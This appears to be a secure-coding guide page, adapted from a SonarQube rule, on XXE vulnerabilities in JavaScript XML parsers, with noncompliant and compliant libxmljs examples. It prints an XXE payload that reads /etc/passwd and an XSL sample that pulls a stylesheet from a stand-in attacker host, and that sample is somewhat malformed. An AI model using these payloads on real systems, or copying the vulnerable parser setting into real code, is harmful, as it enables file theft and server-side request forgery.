# [Code4Sec Week](https://www.facebook.com/hashtag/code4sec) / Day 4 - XML External Entities (XXE) in JavaScript.
[#NEIS0736](https://www.facebook.com/hashtag/neis0736) [#NECS0736](https://www.facebook.com/hashtag/necs0736)

![JavaScript](/images/JS.gif)

## XML parsers should not be vulnerable to XXE attacks

XML specification allows the use of entities that can be internal or external (file system / network access ...) which could lead to vulnerabilities such as confidential file disclosures or SSRFs.

Example in this XML document, an external entity read the /etc/passwd file:

```
<?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
<note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <to>&xxe;</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl">
  <xsl:import href="http://www.attacker.com/evil.xsl"/>
  <xsl:include href="http://www.attacker.com/evil.xsl"/>
 <xsl:template match="/">
  &content;
 </xsl:template>
</xsl:stylesheet>
It is recommended to disable access to external entities and network access in general.
```

**Noncompliant Code Example**

libxmljs module:

```
const libxmljs = require("libxmljs");
var fs = require('fs');

var xml = fs.readFileSync('xxe.xml', 'utf8');

var xmlDoc = libxmljs.parseXmlString(xml, { noblanks: true, noent: true, nocdata: true }); // Noncompliant: noent set to true
```

**Compliant Solution**

libxmljs module:

```
const libxmljs = require("libxmljs");
var fs = require('fs');

var xml = fs.readFileSync('xxe.xml', 'utf8');

var xmlDoc = libxmljs.parseXmlString(xml); // Compliant: noent set to false by default
```

**See**

* OWASP Top 10 2017 Category A4 - XML External Entities (XXE)
* OWASP XXE Prevention Cheat Sheet
* MITRE, CWE-611 - Information Exposure Through XML External Entity Reference
* MITRE, CWE-827 - Improper Control of Document Type Definition

**แหล่งที่มา**

[<img src="/images/sonarqube.svg" alt="SonarQube" height="50">](https://rules.sonarsource.com/javascript/RSPEC-2755)
